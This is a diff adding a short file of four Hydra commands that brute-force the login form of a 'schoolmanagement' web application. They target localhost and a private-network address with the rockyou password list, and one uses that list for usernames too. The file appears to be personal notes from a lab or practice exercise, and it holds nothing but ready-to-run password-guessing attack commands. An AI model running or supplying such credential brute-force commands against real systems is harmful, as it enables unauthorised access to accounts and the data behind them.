@@ -1,0 +1,9 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/schoolmanagement/pages/login.php:username=^USER^&password=^PASS^&login=Login:Invalid username or password"
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/schoolmanagement/pages/login.php:id=^USER^&password=^PASS^&submit=Login:Invalid username or password"
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.210 http-post-form "/schoolmanagement/pages/login.php:id=^USER^&password=^PASS^&submit=Login:Invalid username or password"
+
+hydra -l /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.210 http-post-form "/schoolmanagement/pages/login.php:id=^USER^&password=^PASS^&submit=Login:Invalid username or password"
+
+
